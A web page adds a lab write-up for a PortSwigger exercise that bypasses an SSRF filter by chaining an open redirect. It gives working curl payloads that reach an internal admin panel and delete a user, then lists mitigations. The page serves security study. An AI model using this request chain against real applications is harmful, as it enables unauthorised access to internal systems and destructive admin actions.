@@ -1,0 +1,174 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="How to bypass SSRF filters using an open redirection vulnerability, exploiting a chained attack to access internal admin interfaces."><link rel="canonical" href="https://curlswiggerlabs.github.io/ssrf-filter-bypass-open-redirection/"><link rel="alternate" hreflang="en" href="https://curlswiggerlabs.github.io/en/"><link rel="alternate" hreflang="x-default" href="https://curlswiggerlabs.github.io/en/"><meta property="og:type" content="website"><meta property="og:url" content="https://curlswiggerlabs.github.io/ssrf-filter-bypass-open-redirection/"><meta property="og:title" content="SSRF Filter Bypass via Open Redirection"><meta property="og:description" content="How to bypass SSRF filters using an open redirection vulnerability, exploiting a chained attack to access internal admin interfaces."><meta property="og:locale" content="en_US"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="SSRF Filter Bypass via Open Redirection"><meta name="twitter:description" content="How to bypass SSRF filters using an open redirection vulnerability, exploiting a chained attack to access internal admin interfaces."><meta name="robots" content="index, follow"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300..700&display=swap" rel="stylesheet"><title>SSRF Filter Bypass via Open Redirection</title><style>body{background-color:#0f1117;color:#e2e8f0;margin:20px auto;max-width:900px;line-height:1.6;font-size:18px;padding:0 10px;font-family:Quicksand,sans-serif}h1,h2,h3{line-height:1.2;color:#f8fafc}p{margin:8px 0;color:#94a3b8}li{color:#94a3b8}a{color:#dc2626;text-decoration:none;transition:color .15s ease}a:visited{color:#dc2626}a:hover{color:#ef4444;text-decoration:underline}hr{border:none;border-top:1px solid #1e293b;margin:32px 0}blockquote{border-left:3px solid #dc2626;margin:0;padding:4px 16px;color:#64748b;font-style:italic}img{max-width:100%;border-radius:6px;border:1px solid #1e293b;display:block;margin:0 auto}pre{outline:1px solid #1e293b;background-color:#161b27!important;color:#e1e4e8;padding:8px 16px;display:inline-block;margin:8px 0;font-size:14px;width:100%;position:relative;border-radius:6px;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:break-word}pre:before{content:attr(data-language);position:absolute;top:4px;right:8px;font-size:12px;color:#64748b;font-weight:500}code:not(pre code){background-color:#1e293b;color:#dc2626;padding:2px 6px;border-radius:4px;font-size:.85em}pre code{background:none;padding:0;color:inherit;font-size:inherit}
+</style></head> <body>  <main> <p><a href="/">← Home</a></p> <article> <h1>SSRF Filter Bypass via Open Redirection</h1> <p> <strong>SSRF</strong> ·
+<a href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection" target="_blank" rel="noopener noreferrer">Lab page ↗</a> </p> <h2 id="lab-description-contains-spoilers">Lab Description (contains spoilers)</h2>
+<p>This lab demonstrates how to bypass SSRF filters using an open redirection vulnerability.</p>
+<p>The application has a stock check feature that loads data from an internal system, URL is filtered to prevent direct SSRF attacks but there’s an open redirection vulnerability that can be exploited to bypass these filters.</p>
+<h2 id="writeup">Writeup</h2>
+<p>First let’s explore the lab and identify the stock check feature</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<blockquote>
+<p><strong>Command breakdown</strong>: <br/>
+<code>-s</code> = silent mode (no progress meter) <br/>
+<code>| cat</code> = pipe response output to my <a href="https://github.com/echoesofwhoami/echoes-bat-theme">customized cat command</a> for stylish display</p>
+</blockquote>
+<p>The main page is displayed on the root path, let’s explore it</p>
+<p><img src="/images/ssrf-filter-bypass-open-redirection/01_home_page.png" alt="Home page"/></p>
+<p>In the main page html we can find the product detail link</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="html"><code><span class="line"><span style="color:#E1E4E8">&lt;</span><span style="color:#FDAEB7;font-style:italic">SNIP</span><span style="color:#E1E4E8">&gt;...&lt;</span><span style="color:#FDAEB7;font-style:italic">SNIP</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">      &lt;</span><span style="color:#85E89D">a</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;button&quot;</span><span style="color:#B392F0"> href</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;/product?productId=1&quot;</span><span style="color:#E1E4E8">&gt;View details&lt;/</span><span style="color:#85E89D">a</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">  &lt;/</span><span style="color:#85E89D">div</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">&lt;</span><span style="color:#FDAEB7;font-style:italic">SNIP</span><span style="color:#E1E4E8">&gt;...&lt;</span><span style="color:#FDAEB7;font-style:italic">SNIP</span><span style="color:#E1E4E8">&gt;</span></span></code></pre>
+<p>Lets curl it and see the response.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/product?productId=1&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<p>The product detail page contains the following key elements:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="html"><code><span class="line"><span style="color:#E1E4E8">&lt;</span><span style="color:#FDAEB7;font-style:italic">SNIP</span><span style="color:#E1E4E8">&gt;...&lt;</span><span style="color:#FDAEB7;font-style:italic">SNIP</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">  &lt;</span><span style="color:#85E89D">form</span><span style="color:#B392F0"> id</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;stockCheckForm&quot;</span><span style="color:#B392F0"> action</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;/product/stock&quot;</span><span style="color:#B392F0"> method</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;POST&quot;</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">      &lt;</span><span style="color:#85E89D">select</span><span style="color:#B392F0"> name</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;stockApi&quot;</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">          &lt;</span><span style="color:#85E89D">option</span><span style="color:#B392F0"> value</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;/product/stock/check?productId=1&amp;storeId=1&quot;</span><span style="color:#E1E4E8">&gt;London&lt;/</span><span style="color:#85E89D">option</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">          &lt;</span><span style="color:#85E89D">option</span><span style="color:#B392F0"> value</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;/product/stock/check?productId=1&amp;storeId=2&quot;</span><span style="color:#E1E4E8">&gt;Paris&lt;/</span><span style="color:#85E89D">option</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">          &lt;</span><span style="color:#85E89D">option</span><span style="color:#B392F0"> value</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;/product/stock/check?productId=1&amp;storeId=3&quot;</span><span style="color:#E1E4E8">&gt;Milan&lt;/</span><span style="color:#85E89D">option</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">      &lt;/</span><span style="color:#85E89D">select</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">      &lt;</span><span style="color:#85E89D">button</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;submit&quot;</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;button&quot;</span><span style="color:#E1E4E8">&gt;Check stock&lt;/</span><span style="color:#85E89D">button</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">  &lt;/</span><span style="color:#85E89D">form</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">  &lt;</span><span style="color:#85E89D">span</span><span style="color:#B392F0"> id</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;stockCheckResult&quot;</span><span style="color:#E1E4E8">&gt;&lt;/</span><span style="color:#85E89D">span</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">  &lt;</span><span style="color:#85E89D">script</span><span style="color:#B392F0"> src</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;/resources/js/stockCheckPayload.js&quot;</span><span style="color:#E1E4E8">&gt;&lt;/</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">  &lt;</span><span style="color:#85E89D">script</span><span style="color:#B392F0"> src</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;/resources/js/stockCheck.js&quot;</span><span style="color:#E1E4E8">&gt;&lt;/</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">  &lt;</span><span style="color:#85E89D">div</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;is-linkback&quot;</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">      &lt;</span><span style="color:#85E89D">a</span><span style="color:#B392F0"> href</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;/&quot;</span><span style="color:#E1E4E8">&gt;Return to list&lt;/</span><span style="color:#85E89D">a</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">      &lt;</span><span style="color:#85E89D">a</span><span style="color:#B392F0"> href</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">&quot;/product/nextProduct?currentProductId=1&amp;path=/product?productId=2&quot;</span><span style="color:#E1E4E8">&gt;| Next product&lt;/</span><span style="color:#85E89D">a</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"><span style="color:#E1E4E8">  &lt;/</span><span style="color:#85E89D">div</span><span style="color:#E1E4E8">&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">&lt;</span><span style="color:#FDAEB7;font-style:italic">SNIP</span><span style="color:#E1E4E8">&gt;...&lt;</span><span style="color:#FDAEB7;font-style:italic">SNIP</span><span style="color:#E1E4E8">&gt;</span></span></code></pre>
+<p>There are a couple of interesting things here:</p>
+<ol>
+<li>Some javascript code that provides the client-side behavior of this page</li>
+<li>The path parameter on this link: <code>&lt;a href=&quot;/product/nextProduct?currentProductId=1&amp;path=/product?productId=2&quot;&gt;| Next product&lt;/a&gt;</code></li>
+</ol>
+<p>Lets explore the javascript code to understand the client-side behavior of this page:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/resources/js/stockCheckPayload.js&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<p>Response:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#E1E4E8"># stockCheckPayload.js</span></span>
+<span class="line"><span style="color:#E1E4E8">window.contentType </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &#39;application/x-www-form-urlencoded&#39;</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">function</span><span style="color:#B392F0"> payload</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">data</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> URLSearchParams</span><span style="color:#E1E4E8">(data).</span><span style="color:#B392F0">toString</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>This first JavaScript snippet sets up the content type header and provides a utility function to convert form data into URL-encoded format for the HTTP request.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/resources/js/stockCheck.js&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<p>Response:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#E1E4E8"># stockCheck.js</span></span>
+<span class="line"><span style="color:#E1E4E8">document.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;stockCheckForm&quot;</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">addEventListener</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;submit&quot;</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">function</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">e</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">    checkStock</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">getAttribute</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;method&quot;</span><span style="color:#E1E4E8">), </span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">getAttribute</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;action&quot;</span><span style="color:#E1E4E8">), </span><span style="color:#F97583">new</span><span style="color:#B392F0"> FormData</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8">));</span></span>
+<span class="line"><span style="color:#E1E4E8">    e.</span><span style="color:#B392F0">preventDefault</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">});</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">function</span><span style="color:#B392F0"> checkStock</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">method</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">path</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">data</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#B392F0"> retry</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">tries</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=&gt;</span><span style="color:#E1E4E8"> tries </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span></span>
+<span class="line"><span style="color:#F97583">        ?</span><span style="color:#79B8FF"> null</span></span>
+<span class="line"><span style="color:#F97583">        :</span><span style="color:#B392F0"> fetch</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            path,</span></span>
+<span class="line"><span style="color:#E1E4E8">            {</span></span>
+<span class="line"><span style="color:#E1E4E8">                method,</span></span>
+<span class="line"><span style="color:#E1E4E8">                headers: { </span><span style="color:#9ECBFF">&#39;Content-Type&#39;</span><span style="color:#E1E4E8">: window.contentType },</span></span>
+<span class="line"><span style="color:#E1E4E8">                body: </span><span style="color:#B392F0">payload</span><span style="color:#E1E4E8">(data)</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">          )</span></span>
+<span class="line"><span style="color:#E1E4E8">            .</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">res</span><span style="color:#F97583"> =&gt;</span><span style="color:#E1E4E8"> res.status </span><span style="color:#F97583">===</span><span style="color:#79B8FF"> 200</span></span>
+<span class="line"><span style="color:#F97583">                ?</span><span style="color:#E1E4E8"> res.</span><span style="color:#B392F0">text</span><span style="color:#E1E4E8">().</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">t</span><span style="color:#F97583"> =&gt;</span><span style="color:#B392F0"> isNaN</span><span style="color:#E1E4E8">(t) </span><span style="color:#F97583">?</span><span style="color:#E1E4E8"> t </span><span style="color:#F97583">:</span><span style="color:#E1E4E8"> t </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> &quot; units&quot;</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">                :</span><span style="color:#9ECBFF"> &quot;Could not fetch stock levels!&quot;</span></span>
+<span class="line"><span style="color:#E1E4E8">            )</span></span>
+<span class="line"><span style="color:#E1E4E8">            .</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">res</span><span style="color:#F97583"> =&gt;</span><span style="color:#E1E4E8"> document.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;stockCheckResult&quot;</span><span style="color:#E1E4E8">).innerHTML </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> res)</span></span>
+<span class="line"><span style="color:#E1E4E8">            .</span><span style="color:#B392F0">catch</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">e</span><span style="color:#F97583"> =&gt;</span><span style="color:#B392F0"> retry</span><span style="color:#E1E4E8">(tries </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">));</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">    retry</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>This last script is adding an event listener to the submit event of the html form that we’ve seen earlier (with the id “stockCheckForm”), triggering this event will call the function “checkStock” with the method “POST”, the action “product/stock” and the form data as parameters <code>checkStock(method, path, data)</code> and use the payload function to convert the form data into a x-www-form-urlencoded string as a body for the HTTP request as well as setting the content type header to application/x-www-form-urlencoded.</p>
+<p>Let’s explore the application behavior more deeply. First, let’s emulate the javascript request to check the stock of a product:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/product/stock&quot;</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -H</span><span style="color:#9ECBFF"> &quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -d</span><span style="color:#9ECBFF"> &quot;stockApi=/product/stock/check?productId=1&amp;storeId=1&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<blockquote>
+<p><strong>Command breakdown</strong>: <br/>
+<code>-H &quot;Content-Type: application/x-www-form-urlencoded&quot;</code> = set content type header to application/x-www-form-urlencoded to emulate the javascript request <br/>
+<code>-d &quot;stockApi=/product/stock/check?productId=1&amp;storeId=1&quot;</code> = set the body of the request to the form data, this will automatically set the http method to POST \</p>
+</blockquote>
+<p>This returns:</p>
+<p><code>Response: &quot;Missing parameter&quot;</code></p>
+<p>and made me realize that this endpoint is calling to another one internally and <code>&amp;storeId=1</code> is not getting added as a parameter to the second request but being parsed in the first one so thats why we get “Missing parameter”.</p>
+<p>I’ll validate my suspicions by sending a GET request directly to <code>/product/stock/check?productId=1&amp;storeId=1</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/product/stock/check?productId=1&amp;storeId=1&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<p><code>Response: &quot;414 units&quot;</code></p>
+<p>Now to be absoutely sure about it I will reproduce the same error by not sending the parameter storeId</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/product/stock/check?productId=1&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<p><code>Response: &quot;Missing parameter&quot;</code></p>
+<p>So to make it work we have to encode the amperstamp on the first request</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/product/stock&quot;</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -H</span><span style="color:#9ECBFF"> &quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -d</span><span style="color:#9ECBFF"> &quot;stockApi=/product/stock/check?productId=1%26storeId=1&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<p><code>Response: &quot;414 units&quot;</code></p>
+<p>This confirms a SSRF vector, the request is being called from the stockApi parameter.</p>
+<p>Now let’s try to exploit the SSRF vulnerability directly by attempting to access the internal admin interface:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/product/stock&quot;</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -H</span><span style="color:#9ECBFF"> &quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -d</span><span style="color:#9ECBFF"> &quot;stockApi=http://192.168.0.12:8080/admin&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<p><code>Response: `&quot;Invalid external stock check url &#39;Invalid URL&#39;&quot;</code></p>
+<p>As expected by the name of this lab, the SSRF is blocked. The application has a filter that validates the <code>stockApi</code> parameter and prevents direct access to external URLs, particularly internal network addresses.</p>
+<p>Now let’s test the open redirection vulnerability we found in the <code>path</code> parameter:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/product/nextProduct?currentProductId=1&amp;path=http://portswigger.net&quot;</span><span style="color:#79B8FF"> -v</span></span></code></pre>
+<blockquote>
+<p><strong>Command breakdown</strong>: <br/>
+<code>-v</code> = verbose mode, this will show the response headers</p>
+</blockquote>
+<p>Response: <code>HTTP/2 302</code> with <code>location: http://portswigger.net</code></p>
+<p><img src="/images/ssrf-filter-bypass-open-redirection/04_curl_open_redirect.png" alt="Product detail page"/></p>
+<p>It redirects to portswigger.net, so the open redirect works. The application doesn’t validate the <code>path</code> parameter and will redirect to any URL we provide. This is the key vulnerability we’ll exploit to bypass the SSRF filter.</p>
+<p><strong>Why can’t we exploit the path parameter directly for SSRF?</strong></p>
+<p>The <code>path</code> parameter is used by the <code>/product/nextProduct</code> endpoint, which simply performs an HTTP redirect (302). It doesn’t make a server-side request to the URL like the stock check feature does. The SSRF vulnerability is specifically in the stock check functionality where the server makes an HTTP request to the provided URL.</p>
+<p>The stock check endpoint (<code>/product/stock</code>) is the one vulnerable to SSRF because:</p>
+<ol>
+<li>It accepts a <code>stockApi</code> parameter</li>
+<li>It makes an actual HTTP request to that URL from the server</li>
+<li>It returns the response from that request</li>
+</ol>
+<p>However, the stock check endpoint has URL filtering that prevents direct access to internal systems.</p>
+<p>The open redirect endpoint (<code>/product/nextProduct</code>) doesn’t have SSRF because:</p>
+<ol>
+<li>It only performs a redirect, not a server-side request</li>
+<li>The redirect happens on the client-side (browser follows the 302)</li>
+</ol>
+<p><strong>The Exploit Chain</strong></p>
+<p>We need to chain these vulnerabilities:</p>
+<ol>
+<li>Use the open redirect to bypass the URL filter in the stock check</li>
+<li>The stock check will follow the redirect to the internal admin interface</li>
+<li>This gives us indirect SSRF access to internal systems</li>
+</ol>
+<p>Let’s craft our exploit:</p>
+<p><strong>Note</strong>: In this lab, the target IP <code>192.168.0.12:8080</code> and admin panel location are provided in the lab description. In a real-world scenario, you would need to discover this information through internal network enumeration, port scanning, and path discovery techniques.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/product/stock&quot;</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -H</span><span style="color:#9ECBFF"> &quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -d</span><span style="color:#9ECBFF"> &quot;stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<p>This works because:</p>
+<ol>
+<li><code>stockApi</code> starts with <code>/</code> (allowed - same domain)</li>
+<li>The server requests <code>/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin</code></li>
+<li>The <code>nextProduct</code> endpoint redirects to <code>http://192.168.0.12:8080/admin</code></li>
+<li>The stock check follows the redirect and accesses the internal admin interface</li>
+</ol>
+<p>Response:</p>
+<p><img src="/images/ssrf-filter-bypass-open-redirection/05_admin_panel.png" alt="Product detail page"/></p>
+<p>With access to the admin panel, we can delete the user carlos:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/product/stock&quot;</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -H</span><span style="color:#9ECBFF"> &quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -d</span><span style="color:#9ECBFF"> &quot;stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
+<p>Response:</p>
+<p><img src="/images/ssrf-filter-bypass-open-redirection/06_delete_carlos.png" alt="Product detail page"/></p>
+<p>This last request obliterated the user carlos, solving the lab.</p>
+<h2 id="mitigation">Mitigation</h2>
+<ol>
+<li><strong>Validate all redirects</strong>: Ensure redirects only go to allowed, whitelisted domains</li>
+<li><strong>Filter SSRF targets</strong>: Implement strict allowlists for URLs that can be accessed</li>
+<li><strong>Network segmentation</strong>: Separate internal services from external-facing applications</li>
+<li><strong>URL validation</strong>: Properly parse and validate URLs before making requests, specially when performing server-side requests</li>
+</ol> </article> </main>  </body></html>
